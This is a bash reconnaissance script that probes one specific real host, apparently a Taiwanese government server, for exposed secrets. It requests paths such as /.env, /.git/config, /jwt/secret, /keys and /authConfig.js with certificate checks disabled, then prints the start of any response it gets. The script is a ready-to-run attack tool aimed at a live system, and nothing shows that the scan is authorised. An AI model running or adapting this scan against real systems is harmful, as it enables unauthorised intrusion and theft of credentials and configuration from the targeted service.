#!/bin/bash
B="https://epcr.tpf.gov.tw:4004"
for p in "/config" "/config.js" "/appConfig.js" "/env" "/.env" "/.env.local" "/.env.production" \
         "/.git/config" "/.git/HEAD" "/package.json" "/package-lock.json" \
         "/server.js" "/app.js" "/config.json" "/authConfig.js" "/jwtConfig.js" \
         "/api/config" "/api/env" "/api/version" "/version" "/health" "/status" \
         "/api/jwt" "/secret" "/keys" "/jwt/secret" "/debug" "/debug/vars" \
         "/node_modules/express/package.json" "/src/config.js" "/dist/config.js"; do
  code=$(curl -sk --max-time 8 -o /tmp/resp.txt -w '%{http_code} %{size_download}' "$B$p")
  echo "$code  $p"
  if [ "$code" != "404 0" ] && [ "$code" != "401 *" ]; then
    sz=$(echo "$code" | awk '{print $2}')
    if [ "$sz" != "0" ] && [ "$sz" != "183" ]; then
      echo "    HEAD: $(head -c 200 /tmp/resp.txt | tr '\n' ' ')"
    fi
  fi
done
